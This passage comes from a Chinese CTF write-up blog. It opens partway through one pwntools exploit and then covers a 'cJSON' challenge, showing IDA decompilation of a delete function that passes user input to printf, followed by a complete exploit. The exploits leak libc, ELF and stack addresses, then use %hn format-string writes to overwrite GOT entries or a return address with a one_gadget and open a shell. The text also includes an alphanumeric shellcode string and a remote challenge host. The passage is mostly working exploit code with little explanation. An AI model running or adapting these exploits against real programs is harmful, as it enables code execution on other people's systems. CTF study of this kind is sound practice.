class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x16bd</span></span><br><span class="line">        leak(<span class="string">&quot;elf_base&quot;</span>,elf_base)</span><br><span class="line">        ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">        libc_base=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x24083</span></span><br><span class="line">        <span class="comment"># leak(&#x27;code&#x27;,code)</span></span><br><span class="line">        leak(<span class="string">&#x27;libc&#x27;</span>,libc_base)</span><br><span class="line">        system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        og=[<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">        execve=libc_base+og[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        exit_got=elf_base+<span class="number">0x4020</span></span><br><span class="line">        free_got=elf_base+<span class="number">0x4018</span></span><br><span class="line">        <span class="comment"># ru(b&#x27;your name?\n&#x27;)</span></span><br><span class="line">        <span class="comment"># debug()</span></span><br><span class="line">        leak(<span class="string">&quot;exit_got&quot;</span>,exit_got)</span><br><span class="line"><span class="comment"># 第二步 覆盖exit_got 为 start</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># payload =b&#x27;%c&#x27;*(29-2)+fmt(&#x27;%&#123;(exit_got &amp; 0xffff)-27 &#125;c&#x27;)+b&#x27;%hn&#x27;</span></span><br><span class="line">        <span class="comment"># payload+=b&#x27;%c&#x27;*(58-2-29)+fmt(&#x27;%&#123;0xa1b0 - 0xa020 + 27-0x2&#125;c&#x27;)+b&#x27;%hn&#x27;</span></span><br><span class="line">        target=(elf_base+<span class="number">0x4020</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">        target2=((elf_base+<span class="number">0x11B0</span>)&amp;<span class="number">0xffff</span>)+(<span class="number">0x10000</span>-target)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(target),<span class="built_in">hex</span>(target2))</span><br><span class="line">        payload=<span class="string">f&#x27;%p&#x27;</span>*(<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target-<span class="number">0x142</span>&#125;</span>c%hn&#x27;</span></span><br><span class="line">        payload+=<span class="string">&#x27;%p&#x27;</span>*(<span class="number">58</span>-<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target2-<span class="number">0x129</span>&#125;</span>c%hn&#x27;</span> </span><br><span class="line">        <span class="comment"># debug()</span></span><br><span class="line">        sa(<span class="string">b&#x27;your name?\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;what&#x27;</span>,timeout=<span class="number">2</span>)</span><br><span class="line">        </span><br><span class="line">        system_add=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        p0=<span class="string">&#x27;$29&#x27;</span><span class="comment">#17</span></span><br><span class="line">        p1=<span class="string">&#x27;$64&#x27;</span><span class="comment">#3a</span></span><br><span class="line">        stack_chk_fail_got=elf_base+<span class="number">0x4030</span></span><br><span class="line">        target=(stack_chk_fail_got)&amp;<span class="number">0xffff</span></span><br><span class="line">        target2=(execve)&amp;<span class="number">0xffff</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;stack_chk_fail_got_1&quot;</span>,<span class="built_in">hex</span>(target2))</span><br><span class="line">        <span class="keyword">if</span>(target2&lt;target):target2=target2+(<span class="number">0x10000</span>-target-<span class="number">361</span>)</span><br><span class="line">        <span class="keyword">else</span>: target2=target2-target-<span class="number">361</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;stack_chk_fail_got_1&quot;</span>,<span class="built_in">hex</span>(target),<span class="built_in">hex</span>(target2))</span><br><span class="line">        payload=<span class="string">f&#x27;%p&#x27;</span>*(<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target-<span class="number">0x155</span>&#125;</span>c%hn&#x27;</span></span><br><span class="line">        payload+=<span class="string">&#x27;%p&#x27;</span>*(<span class="number">64</span>-<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target2&#125;</span>c%hn&#x27;</span></span><br><span class="line">        p.sendline(payload) </span><br><span class="line">        debug()</span><br><span class="line">        </span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;what&#x27;</span>,timeout=<span class="number">2</span>)</span><br><span class="line">        p0=<span class="string">&#x27;$29&#x27;</span><span class="comment">#17</span></span><br><span class="line">        p1=<span class="string">&#x27;$64&#x27;</span><span class="comment">#3a</span></span><br><span class="line">        target=(stack_chk_fail_got+<span class="number">2</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">        target2=((execve&gt;&gt;(<span class="number">8</span>*<span class="number">2</span>)))&amp;<span class="number">0xffff</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;stack_chk_fail_got_2&quot;</span>,<span class="built_in">hex</span>(target2))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(target2&lt;target):target2=target2+(<span class="number">0x10000</span>-target-<span class="number">361</span>-<span class="number">0x19</span>)</span><br><span class="line">        <span class="keyword">else</span>: target2=target2-target-<span class="number">361</span>-<span class="number">0x19</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;stack_chk_fail_got_2&quot;</span>,<span class="built_in">hex</span>(target),<span class="built_in">hex</span>(target2))</span><br><span class="line">        payload=<span class="string">f&#x27;%p&#x27;</span>*(<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target-<span class="number">0x155</span>+<span class="number">1</span>&#125;</span>c%hn&#x27;</span></span><br><span class="line">        payload+=<span class="string">&#x27;%p&#x27;</span>*(<span class="number">64</span>-<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target2&#125;</span>c%hn&#x27;</span></span><br><span class="line">        p.sendline(payload) </span><br><span class="line">        </span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;what&#x27;</span>,timeout=<span class="number">2</span>)</span><br><span class="line">        </span><br><span class="line">        p0=<span class="string">&#x27;$29&#x27;</span><span class="comment">#17</span></span><br><span class="line">        p1=<span class="string">&#x27;$64&#x27;</span><span class="comment">#3a</span></span><br><span class="line">        target=(stack_chk_fail_got+<span class="number">4</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">        target2=((execve&gt;&gt;(<span class="number">8</span>*<span class="number">4</span>)))&amp;<span class="number">0xffff</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;stack_chk_fail_got_3&quot;</span>,<span class="built_in">hex</span>(target2))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(target2&lt;target):target2=target2+(<span class="number">0x10000</span>-target-<span class="number">361</span>-<span class="number">0x19</span>)</span><br><span class="line">        <span class="keyword">else</span>: target2=target2-target-<span class="number">361</span>-<span class="number">0x19</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;stack_chk_fail_got_3&quot;</span>,<span class="built_in">hex</span>(target),<span class="built_in">hex</span>(target2))</span><br><span class="line">        payload=<span class="string">f&#x27;%p&#x27;</span>*(<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target-<span class="number">0x155</span>&#125;</span>c%hn&#x27;</span></span><br><span class="line">        payload+=<span class="string">&#x27;%p&#x27;</span>*(<span class="number">64</span>-<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target2&#125;</span>c%hn&#x27;</span></span><br><span class="line">        p.sendline(payload)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;what&#x27;</span>,timeout=<span class="number">2</span>)</span><br><span class="line">        </span><br><span class="line">        p0=<span class="string">&#x27;$29&#x27;</span><span class="comment">#17</span></span><br><span class="line">        p1=<span class="string">&#x27;$64&#x27;</span><span class="comment">#3a</span></span><br><span class="line">        target=(elf_base+<span class="number">0x4020</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">        target2=(elf_base+<span class="number">0x1130</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;exit_got&quot;</span>,<span class="built_in">hex</span>(target2))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(target2&lt;(target+<span class="number">361</span>+<span class="number">0x19</span>)):target2=target2+(<span class="number">0x10000</span>-target-<span class="number">361</span>-<span class="number">0x19</span>)</span><br><span class="line">        <span class="keyword">else</span>: target2=target2-target-<span class="number">361</span>-<span class="number">0x19</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;exit_got&quot;</span>,<span class="built_in">hex</span>(target),<span class="built_in">hex</span>(target2))</span><br><span class="line">        payload=<span class="string">f&#x27;%p&#x27;</span>*(<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target-<span class="number">0x155</span>+<span class="number">1</span>&#125;</span>c%hn&#x27;</span></span><br><span class="line">        payload+=<span class="string">&#x27;%p&#x27;</span>*(<span class="number">64</span>-<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target2&#125;</span>c%hn&#x27;</span></span><br><span class="line">        p.sendline(payload)  </span><br><span class="line">        <span class="comment"># debug()</span></span><br><span class="line">        irt()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># irt()</span></span><br></pre></td></tr></table></figure><p>羡慕比赛写的出来的师傅们，简直太强了！！</p><h1 id="cJSON"><a href="#cJSON" class="headerlink" title="cJSON"></a>cJSON</h1><p>一个很恶心的题目，大部分的程序是没有用处的&#x2F;(ㄒoㄒ)&#x2F;~~，比赛的时候我居然是从头逆到尾，也是长记性了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-64h] BYREF</span></span><br><span class="line">  <span class="type">int</span> nbytes_4; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  _DWORD v7[<span class="number">3</span>]; <span class="comment">// [rsp+14h] [rbp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+28h] [rbp-48h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+30h] [rbp-40h]</span></span><br><span class="line">  <span class="type">void</span> *v11; <span class="comment">// [rsp+38h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+48h] [rbp-28h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_QWORD *)s = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="number">0LL</span>;</span><br><span class="line">  v14 = <span class="number">0LL</span>;</span><br><span class="line">  v15 = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)&amp;v7[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">myinit</span>();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Init Data size: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="built_in">getchar</span>();</span><br><span class="line">  <span class="keyword">if</span> ( nbytes &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Err&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your Json:&quot;</span>);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(nbytes + <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, (<span class="type">unsigned</span> <span class="type">int</span>)nbytes);</span><br><span class="line">  v10 = <span class="built_in">checkjson</span>((__int64)buf);</span><br><span class="line">  <span class="keyword">if</span> ( !v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Parse fail&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">menu</span>();</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes_4);</span><br><span class="line">      <span class="built_in">getchar</span>();</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Data name:&quot;</span>);</span><br><span class="line">      <span class="built_in">fgets</span>(s, <span class="number">0x18</span>, stdin);</span><br><span class="line">      s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( nbytes_4 == <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( nbytes_4 &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">      <span class="keyword">switch</span> ( nbytes_4 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;New data len:&quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v7);</span><br><span class="line">          <span class="built_in">getchar</span>();</span><br><span class="line">          <span class="keyword">if</span> ( v7[<span class="number">0</span>] &gt; <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v11 = <span class="built_in">malloc</span>(v7[<span class="number">0</span>] + <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;New data:&quot;</span>);</span><br><span class="line">            <span class="built_in">read</span>(<span class="number">0</span>, v11, v7[<span class="number">0</span>]);</span><br><span class="line">            v4 = <span class="built_in">sub_5603</span>(v11);</span><br><span class="line">            <span class="built_in">sub_53BA</span>(v10, (__int64)s, v4);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Edit ok&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          v8 = (<span class="type">char</span> *)<span class="built_in">sub_317E</span>(v10);</span><br><span class="line">          <span class="built_in">puts</span>(v8);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          *(_QWORD *)&amp;v7[<span class="number">1</span>] = <span class="built_in">sub_4662</span>(v10, (__int64)s);</span><br><span class="line">          <span class="keyword">if</span> ( !*(_QWORD *)&amp;v7[<span class="number">1</span>] )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;target null&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( *(_DWORD *)(*(_QWORD *)&amp;v7[<span class="number">1</span>] + <span class="number">24LL</span>) == <span class="number">16</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%s]: %s\n&quot;</span>, s, *(<span class="type">const</span> <span class="type">char</span> **)(*(_QWORD *)&amp;v7[<span class="number">1</span>] + <span class="number">32LL</span>));</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( *(_DWORD *)(*(_QWORD *)&amp;v7[<span class="number">1</span>] + <span class="number">24LL</span>) == <span class="number">8</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%s]: %d\n&quot;</span>, s, *(<span class="type">unsigned</span> <span class="type">int</span> *)(*(_QWORD *)&amp;v7[<span class="number">1</span>] + <span class="number">40LL</span>));</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Err Type&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Read ok&quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">LABEL_25:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;err&quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v10 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">del</span>(v10, s);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Delete ok&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;parse fail.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是输入一个size，json然后也是一个功能性的程序，在delete函数中存在一个栈上的格式化字符串漏洞</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">del</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">sub_4662</span>(a1, a2);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(a2);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;] been deleted&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_4E2F</span>(a1, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么思路就是泄露-&gt;覆盖，也是比较清晰的</p><h2 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h2><p>纯格式化字符串漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span> , arch=<span class="string">&#x27;amd64&#x27;</span> , log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> s,n     :<span class="built_in">print</span>(<span class="string">&quot;\033[31m[&quot;</span>+s+<span class="string">&quot; -&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(n))+<span class="string">&quot;]\033[0m&quot;</span>)</span><br><span class="line">fmt =<span class="keyword">lambda</span> string:<span class="built_in">eval</span>(<span class="string">f&quot;f&#x27;&#x27;&#x27;<span class="subst">&#123;string&#125;</span>&#x27;&#x27;&#x27;&quot;</span>, <span class="built_in">globals</span>()).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28282</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p, execute=duan)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">name</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;\n&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Data name:\n&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line">og=[<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">sla(<span class="string">b&#x27;Init Data size: \n&#x27;</span>,<span class="string">b&#x27;20&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Your Json:\n&#x27;</span>,<span class="string">b&#x27;21&#x27;</span>)</span><br><span class="line">show(<span class="string">b&#x27;%27$p%10$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_ret=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)+<span class="number">0x8</span></span><br><span class="line">leak(<span class="string">&#x27;stack_ret&#x27;</span>,stack_ret)</span><br><span class="line"></span><br><span class="line">one_gadget=libc_base+og[<span class="number">1</span>]</span><br><span class="line">leak(<span class="string">&#x27;one_gadget&#x27;</span>,one_gadget)</span><br><span class="line"></span><br><span class="line">payload=(fmt(<span class="string">&#x27;%&#123;one_gadget &amp; 0xffff&#125;c&#x27;</span>)+<span class="string">b&#x27;%22$hn&#x27;</span>).ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(stack_ret)</span><br><span class="line">show(payload)</span><br><span class="line"></span><br><span class="line">payload=(fmt(<span class="string">&#x27;%&#123;(one_gadget&gt;&gt;16) &amp; 0xffff&#125;c&#x27;</span>)+<span class="string">b&#x27;%22$hn&#x27;</span>).ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(stack_ret+<span class="number">2</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">show(payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;&gt;\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;name:\n&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h2><p>格式化字符串漏洞+栈溢出</p><figure class="highlight cpp"><table><tr><td 